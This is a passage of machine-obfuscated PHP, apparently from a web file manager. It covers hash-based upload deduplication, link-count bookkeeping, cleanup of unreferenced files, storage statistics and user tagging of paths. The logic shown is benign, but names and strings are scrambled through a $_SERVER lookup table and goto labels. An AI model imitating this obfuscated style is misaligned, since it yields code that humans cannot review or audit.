addFile($Êô«Œ­¡, $¥º³±úó, $É…êú = false) { $áˆ†¥Øİ =& $_SERVER[Ãìšã«™]; $¯ÕŠÔàö = IO::hashSimple($Êô«Œ­¡); $È¾Ì§ö = IO::size($Êô«Œ­¡); $î‚¹—‚Ş = $È¾Ì§ö <= 1024 * 1024 * 10 ? IO::hashMd5($Êô«Œ­¡) : $áˆ†¥Øİ[12]; $Œ°ÅÅ« = $áˆ†¥Øİ[1881] . $¯ÕŠÔàö; CacheLock::lock($Œ°ÅÅ«); if ($î‚¹—‚Ş && $¯ÕŠÔàö) { $ˆÍ‚Òäå = $this->addFileCheckExist($¯ÕŠÔàö, $î‚¹—‚Ş, $È¾Ì§ö); if ($ˆÍ‚Òäå) { CacheLock::unlock($Œ°ÅÅ«); return $ˆÍ‚Òäå; } } $—¾óØå = $this->addFileMake($Êô«Œ­¡, $È¾Ì§ö, $¯ÕŠÔàö, $î‚¹—‚Ş, $¥º³±úó, $É…êú); $ëø¦ù™ö = $this->addFileData($—¾óØå); CacheLock::unlock($Œ°ÅÅ«); if (!$î‚¹—‚Ş && $ëø¦ù™ö) { $this->fileMd5Check($ëø¦ù™ö); } return $ëø¦ù™ö; } private function fileMd5Check($ ¬ß¡©´) { $ØÇá”èè =& $_SERVER[Ãìšã«™]; $‹ü¬”¯é = array($ ¬ß¡©´[$ØÇá”èè[467]], $ ¬ß¡©´[$ØÇá”èè[78]]); $Êşœ‡  = $ØÇá”èè[1882] . $ ¬ß¡©´[$ØÇá”èè[78]]; $çÇœã = $ØÇá”èè[1883] . $ ¬ß¡©´[$ØÇá”èè[467]]; $½€”Ì‚Ó = TaskQueue::add($ØÇá”èè[1884], $‹ü¬”¯é, $Êşœ‡ , $çÇœã); if (!$½€”Ì‚Ó) { $this->fileMd5Set($ ¬ß¡©´[$ØÇá”èè[467]], $ ¬ß¡©´[$ØÇá”èè[78]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($Òƒ¨ï„, $¼èÚı•©) { $ÆŞØ§Ó± =& $_SERVER[Ãìšã«™]; $Ôñç°¾¿ = $this->find($Òƒ¨ï„); if (!$Ôñç°¾¿ || $Ôñç°¾¿[$ÆŞØ§Ó±[169]]) { return; } $êŒÄ˜•˜ = IO::hashMd5($¼èÚı•©); if (!$êŒÄ˜•˜) { return $ÆŞØ§Ó±[12]; } $this->where(array($ÆŞØ§Ó±[467] => $Òƒ¨ï„))->save(array($ÆŞØ§Ó±[169] => $êŒÄ˜•˜)); } public function addFileMake($Ã¥ÎËê¾, $º²ÏÎœª, $¤£ßªÁ, $ËúĞı, $ŞÏÒ¿äÌ, $Èé¾·úÒ) { $ âş³—¨ =& $_SERVER[Ãìšã«™]; $”å„·çù = $this->createFileName($ŞÏÒ¿äÌ, $¤£ßªÁ, $ËúĞı); $ÒÛ¥¶Å³ = get_path_father($”å„·çù); $€“”µİâ = get_path_this($”å„·çù); if ($Èé¾·úÒ) { $ĞÒöµ—… = IO::move($Ã¥ÎËê¾, $ÒÛ¥¶Å³, !1, $€“”µİâ); } else { $ĞÒöµ—… = IO::copy($Ã¥ÎËê¾, $ÒÛ¥¶Å³, !1, $€“”µİâ); } if (!$ĞÒöµ—…) { return !1; } $¢ï³õûÍ = KodIO::defaultDriver(); $Ë°Šè£• = array($ âş³—¨[579] => $º²ÏÎœª, $ âş³—¨[1878] => 1, $ âş³—¨[421] => $ŞÏÒ¿äÌ, $ âş³—¨[809] => $¢ï³õûÍ[$ âş³—¨[392]], $ âş³—¨[422] => $”å„·çù, $ âş³—¨[1879] => $¤£ßªÁ, $ âş³—¨[1880] => $ËúĞı); return $Ë°Šè£•; } public function addFileCheckExist($íŸÉ™ÏÛ, $¸®İ¤ÊÌ, $ÉÈ¸Ğï’) { $ÄåÑíå =& $_SERVER[Ãìšã«™]; $ıÃÄÌ = $this->findByHash($íŸÉ™ÏÛ, $¸®İ¤ÊÌ); if (!$ıÃÄÌ) { return !1; } $ÕÅ›²¯ = array($ÄåÑíå[1878] => intval($ıÃÄÌ[$ÄåÑíå[1885]]) + 1, $ÄåÑíå[579] => $ÉÈ¸Ğï’); $this->where(array($ÄåÑíå[468] => $ıÃÄÌ[$ÄåÑíå[467]]))->save($ÕÅ›²¯); return $ıÃÄÌ; } public function remove($½ø—Ù·) { $this->linkCountChange($½ø—Ù·, !1); $this->clearEmpty(); return !0; } public function linkAdd($ñ•‰»ØŸ) { $this->linkCountChange($ñ•‰»ØŸ, !0); } public function linkCountChange($úßğÏ–, $ôıåæ«) { $ÊùÅÊñ¨ =& $_SERVER[Ãìšã«™]; if (!$úßğÏ–) { return; } if (!is_array($úßğÏ–)) { $úßğÏ– = array($úßğÏ–); } $´î¡û÷è = array(); foreach ($úßğÏ– as $á”Ó¨–ä) { $±ã½çÊˆ = $á”Ó¨–ä . $ÊùÅÊñ¨[12]; if (!$´î¡û÷è[$±ã½çÊˆ]) { $´î¡û÷è[$±ã½çÊˆ] = 0; } $´î¡û÷è[$±ã½çÊˆ]++; } $¸ü±­¶ = array(); foreach ($´î¡û÷è as $á”Ó¨–ä => $ù­İı) { $±ã½çÊˆ = $ù­İı . $ÊùÅÊñ¨[12]; if (!$¸ü±­¶[$±ã½çÊˆ]) { $¸ü±­¶[$±ã½çÊˆ] = array(); } $¸ü±­¶[$±ã½çÊˆ][] = $á”Ó¨–ä; } foreach ($¸ü±­¶ as $ù­İı => $º¾ËŞå½) { if (!$º¾ËŞå½) { continue; } $ù­İı = $ôıåæ« ? $ù­İı : -intval($ù­İı); $î¸®Øİ = array($ÊùÅÊñ¨[467] => array($ÊùÅÊñ¨[7], $º¾ËŞå½)); if ($ù­İı < 0) { $î¸®Øİ[$ÊùÅÊñ¨[1885]] = array($ÊùÅÊñ¨[1011], abs($ù­İı)); } $this->where($î¸®Øİ)->setAdd($ÊùÅÊñ¨[1885], $ù­İı); } } public function findByHash($‰ÖÇŞôÌ, $ø¯”÷¾ = false) { $æ²÷‘² =& $_SERVER[Ãìšã«™]; if (!$‰ÖÇŞôÌ && !$ø¯”÷¾) { return !1; } $¿„ä—« = array($æ²÷‘²[1879] => $‰ÖÇŞôÌ); if ($ø¯”÷¾) { $¿„ä—« = array($æ²÷‘²[1880] => $ø¯”÷¾); } return $this->order($æ²÷‘²[1886])->where($¿„ä—«)->find(); } public function clearEmpty($ÓíâÖ = 0) { $Ğè½úØå =& $_SERVER[Ãìšã«™]; $ì­Í‰× = time() - 3600 * 24 * $ÓíâÖ; $–´ ÷ßú = $Ğè½úØå[1887] . $ì­Í‰×; $¿¿‡®… = $this->where($–´ ÷ßú)->select(); if (!$¿¿‡®…) { return; } $şÏó†Š… = new Task($Ğè½úØå[1888], $Ğè½úØå[12], count($¿¿‡®…)); foreach ($¿¿‡®… as $¯èàË©) { $şÏó†Š…->update(1); $this->resetFile($¯èàË©); } $şÏó†Š…->end(); } public function resetFile($ãĞğÃ¶‹) { $¹ğú»Ì® =& $_SERVER[Ãìšã«™]; $î³³œÚƒ = array($¹ğú»Ì®[468] => $ãĞğÃ¶‹[$¹ğú»Ì®[467]]); $÷„ÑÉÙÉ = Model($¹ğú»Ì®[1321])->where($î³³œÚƒ)->count(); $€îéİ¨Ş = Model($¹ğú»Ì®[1889])->where($î³³œÚƒ)->count(); $¹ğ£åÖ = intval($÷„ÑÉÙÉ) + intval($€îéİ¨Ş); if ($¹ğ£åÖ == 0) { IO::remove($ãĞğÃ¶‹[$¹ğú»Ì®[78]]); Model($¹ğú»Ì®[1890])->delete($ãĞğÃ¶‹[$¹ğú»Ì®[467]]); $this->where($î³³œÚƒ)->delete(); $this->metaSet($ãĞğÃ¶‹[$¹ğú»Ì®[467]], null, null); return; } if ($ãĞğÃ¶‹[$¹ğú»Ì®[1885]] != $¹ğ£åÖ) { $this->where($î³³œÚƒ)->save(array($¹ğú»Ì®[1878] => $¹ğ£åÖ)); } } public function storageInfo($¨ç¾Ñß¯ = false) { $ÜÄìØ’ë =& $_SERVER[Ãìšã«™]; $ö‰ğ©–Ö = $this->count() + 0.0; $²øÕ¦üĞ = 0; $å—–Œë“ = 1; $çÃå…® = 0; $ƒãûà³û = 5000; for ($Ëó§šÄ· = 0; $Ëó§šÄ· < $ö‰ğ©–Ö; $Ëó§šÄ· = $Ëó§šÄ· + $ƒãûà³û) { $Ş”ÇöÁ = $this->limit($Ëó§šÄ·, $Ëó§šÄ· + $ƒãûà³û)->select(); foreach ($Ş”ÇöÁ as $šõ¼±ª») { $å—–Œë“ += $šõ¼±ª»[$ÜÄìØ’ë[80]] * $šõ¼±ª»[$ÜÄìØ’ë[1885]]; $²øÕ¦üĞ += $šõ¼±ª»[$ÜÄìØ’ë[80]] * ($šõ¼±ª»[$ÜÄìØ’ë[1885]] - 1); $çÃå…® += $šõ¼±ª»[$ÜÄìØ’ë[1885]]; } } $Ü´½±ÜÇ = array($ÜÄìØ’ë[1891] => $å—–Œë“, $ÜÄìØ’ë[1892] => $²øÕ¦üĞ, $ÜÄìØ’ë[1893] => $²øÕ¦üĞ / $å—–Œë“, $ÜÄìØ’ë[84] => $ö‰ğ©–Ö, $ÜÄìØ’ë[1894] => $çÃå…®); return $Ü´½±ÜÇ; } } goto aÑâ©¨Ş¾Ú; bÌ·¥èæè¡: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\162\x5f\x66\x61\166"; protected function cacheFunctionAlias($Èœãéìí) { $âÒ‡ïÌÂ =& $_SERVER[Ãìšã«™]; return array($âÒ‡ïÌÂ[1926] => array(USER_ID, $âÒ‡ïÌÂ[1927])); } protected function listData() { $¡èš¥¢¶ =& $_SERVER[Ãìšã«™]; $Ÿ¡Ô¨ = array($¡èš¥¢¶[1641] => USER_ID, $¡èš¥¢¶[483] => array($¡èš¥¢¶[1930], 0)); $ÄØæ‚âù = $¡èš¥¢¶[1932]; $ãùÁ‚í = $this->field($ÄØæ‚âù)->where($Ÿ¡Ô¨)->order($¡èš¥¢¶[1933])->select(); return $ãùÁ‚í ? $ãùÁ‚í : array(); } protected function listByTag($½üÈ­Ì) { } protected function addToTag($Ÿ˜ª†í, $ŸÃ˜Ş¹) { $¢ÍºæÆ§ =& $_SERVER[Ãìšã«™]; if (!Model($¢ÍºæÆ§[2067])->listData($ŸÃ˜Ş¹) || !Model($¢ÍºæÆ§[826])->pathInfo($Ÿ˜ª†í)) { return !1; } $ÎëÔ‹æÏ = array($¢ÍºæÆ§[1641] => USER_ID, $¢ÍºæÆ§[483] => $ŸÃ˜Ş¹, $¢ÍºæÆ§[422] => $Ÿ˜ª†í, $¢ÍºæÆ§[423] => $¢ÍºæÆ§[417], $¢ÍºæÆ§[421] => $¢ÍºæÆ§[12], $¢ÍºæÆ§[1822] => 0); if ($this->where($ÎëÔ‹æÏ)->find()) { return !1; } return $this->add($ÎëÔ‹æÏ); } protected function removeFromTag($ÂâÙ¤ä, $¿Ãæšë) { $Ü…èşò¸ =& $_SERVER[Ãìšã«™]; if (!Model($Ü…èşò¸[2067])->listData($¿Ãæšë)) { return !1; } if (is_array($ÂâÙ¤ä)) { $ÂâÙ¤ä = array($Ü…èşò¸[7], $ÂâÙ¤ä); } $±ˆ¿Šø = array($Ü…èşò¸[1641] => USER_ID, $Ü…èşò¸[483] => $¿Ãæšë, $Ü…èşò¸[423] => $Ü…èşò¸[417], $Ü…èşò¸[422] => $ÂâÙ¤ä); return $this->where($±ˆ¿Šø)->delete(); } protected function removeByTag($ıŒéÓ­) { $¥˜ûÄîï =& $_SERVER[Ãìšã«™]; if (!$ıŒéÓ­) { return !1; } $¤ÎƒÓÙ = array($¥˜ûÄîï[1641] => USER_ID, $¥˜ûÄîï[483] => $ıŒéÓ­); return $this->where($¤ÎƒÓÙ)->delete(); } protected function removeBySource($’®ğ“¢) { $ş’ÑóŞˆ =& $_SERVER[Ãìšã«™]; if (is_array($’®ğ“¢)) { $’®ğ“¢ = array($ş’ÑóŞˆ[7], $’®ğ“¢); } $úïĞùÏ» = array($ş’ÑóŞˆ[1641] => USER_ID, $ş’ÑóŞˆ[422] => $’®ğ“¢, $ş’ÑóŞˆ[483] => array($ş’ÑóŞˆ[1010], 0)); return $this->where($úïĞùÏ»)->delete(); } }